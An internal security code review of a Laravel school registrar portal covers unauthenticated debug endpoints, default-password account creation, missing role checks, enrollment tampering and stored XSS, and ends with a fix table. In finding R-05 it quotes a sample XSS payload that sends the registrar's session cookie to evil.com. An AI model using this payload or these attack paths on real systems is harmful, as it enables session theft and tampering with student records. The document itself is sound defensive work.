# Registrar Portal — Security Code Review
**Date:** June 6, 2026  
**Reviewer:** Internal Red Team  
**Scope:** `app/Http/Controllers/RegistrarControllers/` (25 files), `app/Http/Controllers/RegistrarV2Controller/` (50+ files), `routes/web.php` (registrar sections), `routes/registrarv2.php`  
**Status:** 100% Complete — all controllers reviewed, all route groups traced

---

## Table of Contents
1. [Scope & Methodology](#1-scope--methodology)
2. [Middleware Analysis](#2-middleware-analysis)
3. [Route Mapping Table](#3-route-mapping-table)
4. [Security Findings](#4-security-findings)
5. [Backend Bugs](#5-backend-bugs)
6. [Frontend Bugs](#6-frontend-bugs)
7. [Fix Recommendations](#7-fix-recommendations)

---

## 1. Scope & Methodology

### Controllers Reviewed
| Directory | Files | Notes |
|---|---|---|
| `RegistrarControllers/` | 25 | Legacy registrar — pre-reg, forms, reports, TOR, scholarship |
| `RegistrarV2Controller/` | 50+ | Modern registrar — school setup, enrollment, grading, sections |
| `DebuggerController.php` | 1 | Standalone — contains unauthenticated production debug endpoints |
| `GeneralController.php` | 1 | Portal switcher — `gotoPortal()` mechanism |

### Route Files
| File | Prefix | Middleware |
|---|---|---|
| `routes/web.php` (lines 832–1175) | none | `auth, isRegistrar, isDefaultPass` |
| `routes/web.php` (lines 2864–2882) | none | **No middleware** |
| `routes/web.php` (lines 3083–3084) | none | **No middleware** |
| `routes/web.php` (line 2900) | none | **No middleware** |
| `routes/registrarv2.php` | `/registrarv2` | `web` only (inner: `auth`) |

---

## 2. Middleware Analysis

### `AuthenticateRegistrar` (alias `isRegistrar`)
```php
// app/Http/Middleware/AuthenticateRegistrar.php
public function handle($request, Closure $next)
{
    if(auth()->user()->type==3 || Session::get('currentPortal') == 3
        || auth()->user()->type==68 || Session::get('currentPortal') == 68){
        return $next($request);
    }
    return back();
}
```
- **Registrar = type 3 or 68**
- Uses `currentPortal` session — same pattern as Teacher middleware
- `currentPortal` is set via `GET /gotoPortal/{id}` in `GeneralController`
- `gotoPortal` validates via `faspriv` table — only users with `faspriv.usertype=3` OR `type=3/17` can switch to portal 3
- **Not directly bypassable by students** — requires a legitimate `faspriv` record or `type=17`

### `AuthenticateAdmission` (alias `isAdmission`)
```php
if(auth()->user()->type== 8 || Session::get('currentPortal') == 8
   || auth()->user()->type== 3 || Session::get('currentPortal') == 3){
    return $next($request);
}
```
Same `currentPortal` mechanism. Allows type 3 (registrar) or type 8 (admission officer).

### `AuthenticateDefaultPass` (alias `isDefaultPass`)
```php
if(Hash::check('123456', auth()->user()->password)){
    return response()->view('resetpass');
}
return $next($request);
```
Blocks access if the user still has the default password `123456`. Intended as a forced password-change gate. **However:** The `fixAccountConflict` endpoint (R-01) creates accounts with `password=123456` — those accounts would be blocked from the registrar portal by this middleware, but are still valid login credentials for unprotected routes.

### `RegistrarV2` Route Group
```php
// app/Providers/RouteServiceProvider.php
Route::prefix('registrarv2')
    ->middleware('web')  // ONLY 'web' — no isRegistrar
    ->namespace(...)
    ->group(base_path('routes/registrarv2.php'));
```
Inside `registrarv2.php`, routes are wrapped in `Route::middleware(['auth'])`. The entire RegistrarV2 module is accessible to **any authenticated user**.

---

## 3. Route Mapping Table

| Method | Route | Controller@Method | Middleware | Risk |
|---|---|---|---|---|
| GET | `/fixAccountConflict` | `DebuggerController@fixAccountConflict` | **None** | CRITICAL |
| GET | `/studentUserDebugger` | `DebuggerController@studentUserDebugger` | **None** | CRITICAL |
| GET | `/early/enrollment/submit` | `PreRegistrationControllerV2@early_enrollment_submit` | **None** | HIGH |
| GET | `/pre/enrollment/submit` | `PreRegistrationControllerV2@pre_enrollment_submit` | **None** | HIGH |
| GET | `/storeprereg/{studentstatus}` | `PreRegistrationController@storeprereg` | **None** | MEDIUM |
| GET | `/getpayables/{studentstatus}` | `PreRegistrationController@getpayables` | **None** | MEDIUM |
| GET | `/prereg/{studentstatus}` | `PreRegistrationController@prereg` | **None** | LOW |
| POST | `/registrarv2/setup/higher-education/colleges` | `CollegesSetupController@store` | `auth` | HIGH |
| PUT | `/registrarv2/setup/higher-education/colleges/{id}` | `CollegesSetupController@update` | `auth` | HIGH |
| DELETE | `/registrarv2/setup/higher-education/colleges/{id}` | `CollegesSetupController@destroy` | `auth` | HIGH |
| POST | `/registrarv2/setup/higher-education/courses` | `CoursesSetupController@store` | `auth` | HIGH |
| DELETE | `/registrarv2/setup/higher-education/courses/{id}` | `CoursesSetupController@destroy` | `auth` | HIGH |
| POST | `/registrarv2/setup/school-year/school-year/create` | `SchoolYearSetupController@createSchoolYear` | `auth` | HIGH |
| DELETE | `/registrarv2/setup/higher-education/prospectus/{id}/delete` | `ProspectusController@deleteSubject` | `auth` | HIGH |
| POST | `/registrarv2/grading-setup/delete` | `HigherEducationGradingSetupController@deleteGradingSetup` | `auth` | HIGH |
| GET | `/registrar/insert/students/sf10` | `RegistrarFormsController@insertsf10grade` | `auth, isRegistrar` | MEDIUM |
| GET | `/registrar/students/search` | `RegistrarFunctionController@studentsearch` | `auth, isAdmission` | MEDIUM |
| GET | `/registrardashboard` (×3) | `RegistrarDashboardController` | mixed | LOW |

---

## 4. Security Findings

### R-01 — CRITICAL — Unauthenticated Mass User Account Creation
**File:** `app/Http/Controllers/DebuggerController.php` (line 94)  
**Route:** `GET /fixAccountConflict` (No middleware at all)  
**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` = **7.5** (practical impact is CRITICAL — creates valid login credentials)

**Vulnerable Code:**
```php
// DebuggerController.php — fixAccountConflict()
public static function fixAccountConflict(){
    $students = DB::table('studinfo')
                    ->leftJoin('users',...)
                    ->select('studinfo.*','users.email')
                    ->get();

    $studentsWithConflict = self::getStudentWithConflict($students);

    foreach($studentsWithConflict as $item){
        if($item->NSA){  // No Student Account
            $userId = DB::table('users')->insertGetId([
                'name'     => $item->studentname,
                'email'    => 'S'.$item->studentid,
                'password' => Hash::make('123456'),  // DEFAULT PASSWORD
                'type'     => '7',   // student type
                'deleted'  => '0'
            ]);
        }
        if($item->NPA){  // No Parent Account
            $userId = DB::table('users')->insertGetId([
                'name'     => $item->studentname,
                'email'    => 'P'.$item->studentid,
                'password' => Hash::make('123456'),  // DEFAULT PASSWORD
                'type'     => '9',
                'deleted'  => '0'
            ]);
        }
        // Also handles duplicate account cleanup...
    }
}
```

**Attack Path:**
1. Any unauthenticated person calls `GET /fixAccountConflict`
2. The function queries ALL active students in `studinfo`
3. For each student missing a login account, it creates one with password `123456`
4. Attacker knows student IDs (or email = `S<sid>`) and logs in with `123456`
5. From there, ST-02 (unauthenticated SMS injection) can be combined with new accounts for full student portal access

**This is a development tool left in production with no access control.** The comment in the file confirms it was designed for debugging account conflicts.

---

### R-02 — CRITICAL — Unauthenticated Student Database Enumeration
**File:** `app/Http/Controllers/DebuggerController.php` (line 12)  
**Route:** `GET /studentUserDebugger` (No middleware at all)  
**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = **7.5**

**Vulnerable Code:**
```php
public function studentUserDebugger(){
    $students = DB::table('studinfo')
                    ->where('studstatus','1')
                    ->get();   // Returns ALL active students

    $studentsWithConflict = self::getStudentWithConflict($students);

    return view('adminPortal.pages.debugger.studentaccount')
            ->with('studentsWithConflict', $studentsWithConflict)
            ->with('numberofStudents', count($students));
}
```

**Impact:** Full student list — student IDs (`sid`), user IDs (`userid`), names — returned to any unauthenticated visitor. Combined with R-01, an attacker can enumerate all students and then trigger account creation for any without an account.

---

### R-03 — HIGH — Unauthenticated Enrollment Record Manipulation
**File:** `app/Http/Controllers/RegistrarControllers/PreRegistrationControllerV2.php` (lines 1768, 1849)  
**Routes:**
- `GET /early/enrollment/submit` — No middleware
- `GET /pre/enrollment/submit` — No middleware  
**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` = **7.5**

**Vulnerable Code — early_enrollment_submit:**
```php
public function early_enrollment_submit(Request $request)
{
    $studid  = $request->get('studid');   // ATTACKER-CONTROLLED
    $syid    = $request->get('syid');
    $semid   = $request->get('semid');
    $levelid = $request->get('levelid');  // Grade level to falsely enroll into
    // No authentication check
    DB::table('earlybirds')->insert([
        'studid'  => $studid,
        'syid'    => $syid,
        'semid'   => $semid,
        'levelid' => $gradelevel_to_enroll,
        ...
    ]);
}
```

**Vulnerable Code — pre_enrollment_submit:**
```php
public function pre_enrollment_submit(Request $request)
{
    $studid = $request->get('studid');   // ATTACKER-CONTROLLED
    // No authentication check
    DB::table('studinfo')
        ->where('id', $studid)
        ->take(1)
        ->update(['preEnrolled' => 1]);   // Marks ANY student as pre-enrolled
}
```

**Impact:**
- `early_enrollment_submit`: Any student can be pre-registered for any grade level in the `earlybirds` table — registrar sees fake early enrollment submissions
- `pre_enrollment_submit`: Any student's `preEnrolled` flag can be set to 1 — bypasses the registrar's verification step

---

### R-04 — HIGH — Privilege Escalation: RegistrarV2 CRUD Under `['auth']` Only
**File:** `routes/registrarv2.php` (entire file)  
**Routes:** All `/registrarv2/*` routes  
**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H` = **8.1**

**Issue:**
```php
// app/Providers/RouteServiceProvider.php
Route::prefix('registrarv2')
    ->middleware('web')    // NO isRegistrar — only web session middleware
    ->group(base_path('routes/registrarv2.php'));

// routes/registrarv2.php — inner group
Route::middleware(['auth'])->group(function () {  // ANY authenticated user
    Route::delete('/setup/higher-education/colleges/{id}', [CollegesSetupController::class, 'destroy']);
    Route::delete('/setup/higher-education/courses/{id}',  [CoursesSetupController::class, 'destroy']);
    Route::delete('/setup/higher-education/prospectus/{prospectusId}/delete', ...);
    Route::post('/grading-setup/delete',  [HigherEducationGradingSetupController::class, 'deleteGradingSetup']);
    Route::post('/setup/school-year/school-year/create', ...);
    // 50+ more destructive operations
```

**Impact:** Any logged-in student, teacher, parent, or cashier can:
- Delete colleges, courses, subjects, curricula, prospectus items
- Create new school years and manipulate academic periods
- Delete grading setups (disrupting the entire grading system)
- Update school configuration and admission settings

---

### R-05 — HIGH — Stored XSS in Student Search HTML Response
**File:** `app/Http/Controllers/RegistrarControllers/RegistrarFunctionController.php` (line ~280)  
**Route:** AJAX responses in `studentsearch()` and `enrollgetinfo()`  
**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` = **8.7** (stored XSS)

**Vulnerable Code:**
```php
public function studentsearch(Request $request)
{
    // ...queries students...
    $output .= '<tr>
        <td> '.$status.' '.$s->sid.'</td>
        <td><a href="studentinfo/edit/'.$s->id.'">'.$s->firstname.' '.$s->lastname.'</a></td>
        <td>'.$s->gender.'</td>
        <td>'.$s->levelname.'</td>
        <td>'.$s->sectionname.'</td>  <!-- sectionname not in query — undefined -->
        ...
    </tr>';

    echo json_encode(array('output' => $output));
}
```

Attacker flow: Create a student record with `firstname = '<script>fetch("https://evil.com/"+document.cookie)</script>'` (via the pre-registration public form or directly). Every time a registrar searches for that student, the script executes in the registrar's browser, stealing their session cookie.

---

### R-06 — MEDIUM — Public Pre-Registration Form: No Rate Limiting or CAPTCHA
**Routes:** `GET /prereg/{studentstatus}`, `GET /storeprereg/{studentstatus}`, `GET /preregsenior` (No middleware)  
**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L` = **6.5**

These routes serve and process the public student pre-registration form with no authentication, no CAPTCHA, no rate limiting, and no duplicate detection beyond exact name match. An attacker can submit thousands of fake registrations:
- Fills the `preregistration` table with garbage data
- Generates fake queue codes
- Disrupts the registrar's workflow during enrollment season

---

### R-07 — MEDIUM — Debug Endpoint with Hardcoded Production Data
**File:** `app/Http/Controllers/RegistrarControllers/RegistrarFormsController.php` (line 158)  
**Route:** `GET /registrar/insert/students/sf10` (under `auth, isRegistrar`)  
**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:M/A:N` = **4.9**

```php
public static function insertsf10grade(Request $request){
    $sf10header = (object)[
        'studid'        => '75',           // HARDCODED real student ID
        'schoolid'      => '201120008',    // HARDCODED school ID (DepEd code)
        'schoolname'    => 'SOUTH CITY CENTRAL SCHOOL',
        'schooladdress' => 'Nazareth, Cagayan de Oro City',
        ...
    ];
    // Inserts test grade records into sf10_student_elem for studid=75
```

A registrar calling this endpoint inserts dummy SF10 academic records for student ID 75. This pollutes production data and could corrupt a real student's academic transcript.

---

### R-08 — LOW — Triple-Defined Resource Route (`registrardashboard`)
**File:** `routes/web.php` (lines 838, 1174, 3674)

```php
// Line 838 — auth, isRegistrar, isDefaultPass
Route::resource('/registrardashboard', 'RegistrarControllers\RegistrarDashboardController');

// Line 1174 — auth, isRegistrar, isDefaultPass (duplicate)
Route::resource('/registrardashboard', 'RegistrarControllers\RegistrarDashboardController');

// Line 3674 — auth, isRegistrar, isDefaultPass (triplicate)
Route::resource('/registrardashboard', 'RegistrarControllers\RegistrarDashboardController');
```

Laravel silently uses the first registration. The later two are dead but cause confusion and maintenance risk.

---

### R-09 — LOW — `early/enrollment/submit` Also Registered Twice
**File:** `routes/web.php` (lines 3083 and 4928)

Both instances are outside middleware groups. Same impact as R-08 — first registration wins, second is unreachable dead code.

---

## 5. Backend Bugs

### BUG-R-01 — `studentsearch()` References Undefined `sectionname`
**File:** `RegistrarFunctionController.php` (line ~297)

```php
$student = db::table('studinfo')
    ->select('studinfo.*', 'gradelevel.levelname')
    ->join('gradelevel', 'studinfo.levelid', '=', 'gradelevel.id')
    // No JOIN on sections table
    ->get();

// Then references $s->sectionname — UNDEFINED PROPERTY
$output .= '<td>'.$s->sectionname.'</td>';
```

Every search result renders an empty `sectionname` cell. PHP emits a notice and the section column is always blank in the registrar's student search results.

---

### BUG-R-02 — `enrollgetinfo()` Uses `echo` Instead of Response
**File:** `RegistrarFunctionController.php` (line ~119)

```php
// Non-Laravel pattern — bypasses response middleware
echo json_encode($data);
```

Should use `return response()->json($data)`. This bypasses response formatting middleware and could interact poorly with exception handlers.

---

### BUG-R-03 — `PreRegistrationController@prereg()` Ignores `$studentstatus` Parameter
**File:** `PreRegistrationController.php` (line 19)

```php
public function prereg($studentstatus)
{
    // $studentstatus = Crypt::decrypt($studentstatus);   // COMMENTED OUT
    // if($studentstatus == 'new'){                       // COMMENTED OUT
    
    // Always executes the "new student" path regardless of $studentstatus
    return view("registrar.preregistration")...;
    
    // else if($studentstatus == 'old'){                  // All commented out
```

The `$studentstatus` URL parameter is completely ignored — old student re-enrollment goes through the new student form. The old student path is commented out.

---

### BUG-R-04 — `pre_enrollment_submit` Catches Exception but Logs via Null User
**File:** `PreRegistrationControllerV2.php` (line ~1870)

```php
} catch (\Exception $e) {
    DB::table('zerrorlogs')->insert([
        'error'           => $e,         // Exception object inserted as-is
        'createdby'       => auth()->user()->id,  // NULL for unauthenticated callers
        'createddatetime' => ...
    ]);
}
```

Since this route has no auth middleware, `auth()->user()` returns `null`. If an exception occurs, `auth()->user()->id` throws `Trying to get property of non-object` — the catch block itself throws an exception, masking the original error.

---

## 6. Frontend Bugs

### FE-R-01 — HTML Injection via Unescaped Database Output (Multiple Methods)
**File:** `RegistrarFunctionController.php` (lines ~280–330)

Multiple methods (`studentsearch`, `enrollgetinfo`) build HTML strings by directly concatenating database values without `htmlspecialchars()` or `e()`:

```php
$output .= '<a href="studentinfo/edit/'.$s->id.'">'
         . $s->firstname . ' ' . $s->lastname    // UNESCAPED DB VALUES
         . '</a>';
```

If a student's name contains `<script>` or `<img onerror=>` tags (enterable via public pre-registration form), they execute in the registrar's browser each time search results are displayed.

---

## 7. Fix Recommendations

| Finding | Priority | Fix |
|---|---|---|
| R-01 (fixAccountConflict) | **IMMEDIATE** | Remove route entirely OR add `['auth', 'isSuperAdmin']` middleware |
| R-02 (studentUserDebugger) | **IMMEDIATE** | Remove route entirely |
| R-03 (early/pre enrollment) | **IMMEDIATE** | Add `['auth', 'isStudent']` or `['auth', 'isRegistrar']` to both routes |
| R-04 (registrarv2 no auth) | **IMMEDIATE** | Add `'isRegistrar'` to `mapRegistrarV2Routes()` in RouteServiceProvider |
| R-05 (stored XSS search) | High | Wrap all DB concatenations with `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` or use Blade `{{ }}` in views |
| R-06 (no rate limiting) | High | Add Laravel `throttle:10,1` middleware to prereg routes + CAPTCHA |
| R-07 (debug SF10 endpoint) | Medium | Remove `GET /registrar/insert/students/sf10` route or disable the method |
| BUG-R-01 (sectionname) | Medium | Add `->join('sections','enrolledstud.sectionid','=','sections.id')` to query |
| BUG-R-04 (null user in catch) | Medium | Move `auth()->user()->id` to a variable before the try block; default to 0 for unauthenticated |
| R-08/R-09 (duplicate routes) | Low | Remove duplicate registrations at lines 1174, 3674, 4928 |

---

*End of Registrar Portal Code Review*
